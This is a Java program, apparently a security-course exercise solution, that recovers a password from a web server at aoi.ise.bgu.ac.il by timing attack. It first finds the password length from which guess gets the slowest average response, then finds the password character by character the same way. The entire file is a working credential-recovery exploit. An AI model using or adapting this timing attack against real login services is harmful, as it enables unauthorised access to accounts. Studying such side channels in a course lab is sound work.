import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.util.HashMap;
import java.util.Map;


public class ex01_M1 {

    public static int MIN_PASSWORD_LENGTH = 1;
    public static int MAX_PASSWORD_LENGTH = 16;
    public static int CHECK_PASSWORD_LENGTH_ATTEMPTS = 30;
    public static int FOUND_THE_PASSWORD = -1;
    public static int ERROR_WHILE_CHECK_TIME = 0;
    public static int CHECK_PASSWORD_CHARS_ATTEMPTS = 30;

    /*
     Returns the current value of the most precise available system timer, in nanoseconds.
     */
    public static long getCurrentTime() {
        return System.nanoTime();
    }

    public static long checkResponseTime(String url) {
        long start, end;
        try {
            URL site = new URL(url);
            URLConnection conn = site.openConnection();
            start = getCurrentTime();
            conn.connect();
            end = getCurrentTime();
            String body = new String(conn.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            if("1".equals(body)){
                System.out.println(url);
                return FOUND_THE_PASSWORD;
            }

        } catch (MalformedURLException e) {
            System.out.println("Invalid URL Format");
            return ERROR_WHILE_CHECK_TIME;
        } catch (IOException e) {
            System.out.println("Failed connect to the URL server");
            return ERROR_WHILE_CHECK_TIME;
        }
        return end - start;
    }

    public static int checkPasswordLength(String url) {
        Map<Integer, Long> passwordLengthToSumTime =  new HashMap<>();
        Map<Integer, Integer> passwordLengthAttempts =  new HashMap<>();
        Map<Integer, String> passwordStrings =  new HashMap<Integer, String>();
        for (int i = MIN_PASSWORD_LENGTH ; i <= MAX_PASSWORD_LENGTH ; i++)
        {
            passwordLengthToSumTime.put(i, (long) 0);
            passwordLengthAttempts.put(i, 0);
            passwordStrings.put(i, String.format(url, new String(new char[i]).replace("\0", "a")));
        }

        long responseTime;

        for (int i = 0; i < CHECK_PASSWORD_LENGTH_ATTEMPTS; i++)
        {
            if (i % (CHECK_PASSWORD_LENGTH_ATTEMPTS / 10) == 0)
            {
                System.out.println(String.format("checked %d", i));
            }
            for (int passwordLength = MIN_PASSWORD_LENGTH ; passwordLength <= MAX_PASSWORD_LENGTH ; passwordLength++)
            {
                responseTime = checkResponseTime(passwordStrings.get(passwordLength));
                if (responseTime != ERROR_WHILE_CHECK_TIME && responseTime != FOUND_THE_PASSWORD)
                {
                    passwordLengthToSumTime.put(passwordLength, responseTime + passwordLengthToSumTime.get(passwordLength));
                    passwordLengthAttempts.put(passwordLength, passwordLengthAttempts.get(passwordLength) + 1);
                }
            }
        }

        int maxAveragePasswordLength = MIN_PASSWORD_LENGTH;
        long maxAverage = passwordLengthToSumTime.get(MIN_PASSWORD_LENGTH) / passwordLengthAttempts.get(MIN_PASSWORD_LENGTH);
        for (int i = MIN_PASSWORD_LENGTH ; i <= MAX_PASSWORD_LENGTH ; i++) {
            long currentAverage = passwordLengthToSumTime.get(i) / passwordLengthAttempts.get(i);
            System.out.println(String.format("Length %d took %d", i, currentAverage));
            if (currentAverage > maxAverage)
            {
                maxAveragePasswordLength = i;
                maxAverage = currentAverage;
            }
        }

        return maxAveragePasswordLength;
    }

    public static String checkThePassword(String url, int passwordLength)
    {
        long responseTime;
        char[] availablePasswordChar = new char[]{'0','1','2','3','4','5','6','7','8','9', 'a','b','c','d','e','f','g',
                'h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','A','B','C','D','E','F','G',
                'H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'};

        String charactersFoundFromPassword = "";
        for (int currentPasswordIndex = 0; currentPasswordIndex < passwordLength; currentPasswordIndex++) {
            Map<Character, Long> passwordToSumTime =  new HashMap<Character, Long>();
            Map<Character, Integer> passwordAttempts =  new HashMap<Character, Integer>();
            Map<Character, String> passwordStrings =  new HashMap<Character, String>();

            for (char someChar: availablePasswordChar)
            {
                passwordToSumTime.put(someChar, (long) 0);
                passwordAttempts.put(someChar, 0);
                String password = String.format("%s%c%s", charactersFoundFromPassword, someChar,
                        new String(new char[passwordLength - currentPasswordIndex - 1]).replace("\0", "a"));
                passwordStrings.put(someChar, String.format(url, password));
            }

            for (int i = 0; i < CHECK_PASSWORD_CHARS_ATTEMPTS; i++)
            {
                if (i % (CHECK_PASSWORD_CHARS_ATTEMPTS / 10) == 0)
                {
                    System.out.println(String.format("checked %d", i));
                }
                for (char someChar: availablePasswordChar)
                {
                    responseTime = checkResponseTime(passwordStrings.get(someChar));
                    if (responseTime != ERROR_WHILE_CHECK_TIME && responseTime != FOUND_THE_PASSWORD)
                    {
                        passwordToSumTime.put(someChar, responseTime + passwordToSumTime.get(someChar));
                        passwordAttempts.put(someChar, passwordAttempts.get(someChar) + 1);
                    }
                    else if (responseTime == FOUND_THE_PASSWORD)
                    {
                        return passwordStrings.get(someChar);
                    }
                }
            }

            char maxAveragePasswordChar = availablePasswordChar[0];
            long maxAverage = passwordToSumTime.get(availablePasswordChar[0]) / passwordAttempts.get(availablePasswordChar[0]);
            for (char someChar: availablePasswordChar)
            {
                long currentAverage = passwordToSumTime.get(someChar) / passwordAttempts.get(someChar);
                System.out.println(String.format("char %c took %d", someChar, currentAverage));
                if (currentAverage > maxAverage)
                {
                    maxAveragePasswordChar = someChar;
                    maxAverage = currentAverage;
                }
            }

            charactersFoundFromPassword = String.format("%s%c", charactersFoundFromPassword, maxAveragePasswordChar);
            System.out.println(String.format("Password until now is %s", charactersFoundFromPassword));
        }

        return charactersFoundFromPassword;
    }

    public static void main(String[] args) {
        if(args.length != 1) {
            System.out.println("Missing URL argument");
            System.exit(0);
        }

        // first call to do some setup in java:
        checkResponseTime("http://aoi.ise.bgu.ac.il/?user=ID&password=1234&difficulty=1");

        int passwordLength = checkPasswordLength("http://aoi.ise.bgu.ac.il/?user=ID&password=%s&difficulty=1");
        System.out.println(String.format("Password length is %d", passwordLength));

        String password = checkThePassword("http://aoi.ise.bgu.ac.il/?user=ID&password=%s&difficulty=1", passwordLength);
        System.out.println(String.format("The password is %s", password));
    }
}
